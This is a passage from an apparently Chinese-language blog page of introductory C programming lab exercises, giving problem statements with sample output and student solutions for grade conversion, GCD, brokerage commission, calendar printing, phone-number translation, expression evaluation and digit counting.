class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> grade;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter numerical grade: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;grade);<br>    <span class="hljs-keyword">if</span> (grade &lt; <span class="hljs-number">0</span> || grade &gt; <span class="hljs-number">100</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error, grade must be between 0 and 100.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    grade /= <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">switch</span> (grade)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: A&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: A&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: B&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: C&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: D&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Letter grade: F&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error, grade must be between 0 and 100.\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="最大公约数（GCD-Greatest-Common-Divisor）"><a href="#最大公约数（GCD-Greatest-Common-Divisor）" class="headerlink" title="最大公约数（GCD, Greatest Common Divisor）"></a>最大公约数（GCD, Greatest Common Divisor）</h3><blockquote><p>编写程序，要求用户输入两个整数，然后计算这两个整数的最大公约数（GCD, Greatest Common Divisor）。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter two integers: 12 28<br>Greatest common divisor: 4</p></blockquote><blockquote><p>Enter two integers：1 9<br>Greatest common divisor：1</p></blockquote><p>提示：求最大公约数的经典算法 Euclid 算法如下：<br>分别让变量 m 和 n 存储两个整数。如果 n 为 0，那么停止操作，m 中的值是 GCD ；否则计算 m 除以 n 的余数，把 n 保存到 m 中，并把余数保存到 n 中；重复上述操作，每次都先判断n是否为 0 。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getGCD</span><span class="hljs-params">(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> m;<br><br>    <span class="hljs-keyword">return</span> getGCD(n, m % n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> m, n;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter two integers: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;m, &amp;n);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Greatest common divisor: %d&quot;</span>, getGCD(m, n));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="股经纪人的佣金（Brokerage）"><a href="#股经纪人的佣金（Brokerage）" class="headerlink" title="股经纪人的佣金（Brokerage）"></a>股经纪人的佣金（Brokerage）</h3><blockquote><p>在下列程序中添加循环，以便用户可以输入多笔交易并且程序可以计算每次的佣金。程序在用户输入的交易额为 0 时终止。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter value of trade: 30000<br>Commission：$166.00</p></blockquote><blockquote><p>Enter value of trade: 20000<br>Commission：$144.00</p></blockquote><blockquote><p>Enter value of trade: 0</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * broker.c</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">fff</span><span class="hljs-params">(<span class="hljs-type">float</span> value)</span><br>&#123;<br><br>    <span class="hljs-type">float</span> commission;<br>    <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">2500.00f</span>)<br>        commission = <span class="hljs-number">30.00f</span> + <span class="hljs-number">.017</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">6250.00f</span>)<br>        commission = <span class="hljs-number">56.00f</span> + <span class="hljs-number">.0066</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">20000.00f</span>)<br>        commission = <span class="hljs-number">76.00f</span> + <span class="hljs-number">.0034</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">50000.00f</span>)<br>        commission = <span class="hljs-number">100.00f</span> + <span class="hljs-number">.0022</span>f * value;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">500000.00f</span>)<br>        commission = <span class="hljs-number">155.00f</span> + <span class="hljs-number">.0011</span>f * value;<br>    <span class="hljs-keyword">else</span><br>        commission = <span class="hljs-number">255.00f</span> + <span class="hljs-number">.0009</span>f * value;<br><br>    <span class="hljs-keyword">if</span> (commission &lt; <span class="hljs-number">39.00f</span>)<br>        commission = <span class="hljs-number">39.00f</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Commission: $%.2f\n\n&quot;</span>, commission);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">float</span> value;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter value of trade: &quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;value);<br>        <span class="hljs-keyword">if</span> (!value)<br>            <span class="hljs-keyword">break</span>;<br><br>        fff(value);<br>        <span class="hljs-type">char</span> c = getchar();<br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="偶数平方（Square-of-Even-Number）"><a href="#偶数平方（Square-of-Even-Number）" class="headerlink" title="偶数平方（Square of Even Number）"></a>偶数平方（Square of Even Number）</h3><blockquote><p>编写程序，提示用户输入一个数 n，然后显示出 1~n 的所有偶数的平方值。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a number: 100<br>4<br>16<br>36<br>64<br>100</p></blockquote><blockquote><p>Enter a number: 50<br>4<br>16<br>36</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> n, i = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br>    <span class="hljs-keyword">while</span> (i * i &lt; n)<br>    &#123;<br>        i += <span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i * i);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="日历（Calendar-Month）"><a href="#日历（Calendar-Month）" class="headerlink" title="日历（Calendar Month）"></a>日历（Calendar Month）</h3><blockquote><p>编写程序显示单月的日历。用户指定这个月的天数和该月起始日是星期几。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter number of days in month: 31</p><p>Enter starting day of the week(1&#x3D;Sun, 7&#x3D;Sat): 3</p></blockquote><table><thead><tr><th align="center">日</th><th align="center">一</th><th align="center">二</th><th align="center">三</th><th align="center">四</th><th align="center">五</th><th align="center">六</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td></tr><tr><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">10</td><td align="center">11</td><td align="center">12</td></tr><tr><td align="center">13</td><td align="center">14</td><td align="center">15</td><td align="center">16</td><td align="center">17</td><td align="center">18</td><td align="center">19</td></tr><tr><td align="center">20</td><td align="center">21</td><td align="center">22</td><td align="center">23</td><td align="center">24</td><td align="center">25</td><td align="center">26</td></tr><tr><td align="center">27</td><td align="center">28</td><td align="center">29</td><td align="center">30</td><td align="center">31</td><td align="center"></td><td align="center"></td></tr></tbody></table></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">outputCalender</span><span class="hljs-params">(<span class="hljs-type">int</span> days, <span class="hljs-type">int</span> start)</span><br>&#123;<br>    start %= <span class="hljs-number">8</span>;<br>    <span class="hljs-type">int</span> counts = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// printf(&quot;日\t一\t二\t三\t四\t五\t六\n&quot;);</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (days + start - <span class="hljs-number">1</span>) / <span class="hljs-number">7</span> + <span class="hljs-number">1</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">7</span>; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> ((i == <span class="hljs-number">0</span> &amp;&amp; j &lt; start - <span class="hljs-number">1</span>) || counts &gt; days)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\t&quot;</span>, counts++);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> days, start;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;days);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;start);<br>    outputCalender(days, start);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><h3 id="翻译（Translation）"><a href="#翻译（Translation）" class="headerlink" title="翻译（Translation）"></a>翻译（Translation）</h3><blockquote><p>编写程序可以把字母格式的电话号码翻译成数值格式：</p><blockquote><p>Enter phone number: CALLATT</p><p>2255288</p></blockquote><p>如果没有电话在身边,参考这里给出的字母在键盘上的对应关系：（2&#x3D;ABC，3&#x3D;DEF，4&#x3D;GHI，5&#x3D;JKL，6&#x3D;MNO，7&#x3D;PQRS，8&#x3D;TUV，9&#x3D;WXYZ）原始电话号码中的非字母字符（例如数字或标点符号）保持不变：</p><p>Enter phone number: 1-800-COL-LECT1-800-265-5328</p><p>可以假设任何用户输入的字母都是大写字母。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter phone number: 1-DCKS-A2D-OLED</p><p>1-3257-223-6533</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><br><span class="hljs-comment">// 貌似有点笨这方法</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br><br>        <span class="hljs-keyword">switch</span> (ch)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;A&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;B&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;2&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;D&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;F&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;3&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;G&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;H&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;I&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;4&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;J&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;K&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;L&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;5&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;N&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;O&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;6&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;P&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;Q&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;R&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;7&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;T&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;V&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;U&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;8&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;Y&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;W&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;X&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;9&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">putchar</span>(ch);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="表达式求值（Expression-Evaluation）"><a href="#表达式求值（Expression-Evaluation）" class="headerlink" title="表达式求值（Expression Evaluation）"></a>表达式求值（Expression Evaluation）</h3><blockquote><p>编写程序对表达式求值。</p><blockquote><p>Enter an expression: 1+2.5*3<br>Value of expression: 10.5</p></blockquote><p>表达式中的操作数是浮点数，运算符是+、-、*和&#x2F;。表达式从左向右求值（所有运算符的优先级都⼀样）。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter an expression: 2+3*4-5&#x2F;2<br>Value of expression: 7.5</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-type">float</span> num, num2;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;num);<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;num2);<br>        <span class="hljs-keyword">switch</span> (ch)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>            num += num2;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>            num -= num2;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>            num *= num2;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/&#x27;</span>:<br>            num /= num2;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="出现次数（Number-Occurrences）"><a href="#出现次数（Number-Occurrences）" class="headerlink" title="出现次数（Number Occurrences）"></a>出现次数（Number Occurrences）</h3><blockquote><p>修改如下程序，使其打印⼀份列表，显示出每个数字在数中出现的次数。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a number: 41271092</p><table><thead><tr><th align="center">Digit:</th><th align="center">0</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9</th></tr></thead><tbody><tr><td align="center">Occurrences:</td><td align="center">1</td><td align="center">2</td><td align="center">2</td><td align="center">0</td><td align="center">1</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">0</td><td align="center">1</td></tr></tbody></table></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">int</span> occ[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Digit:0123456789&quot;</span>);<br>    <span class="hljs-keyword">while</span> ((num = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (num)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;0&#x27;</span>:<br>            occ[<span class="hljs-number">0</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        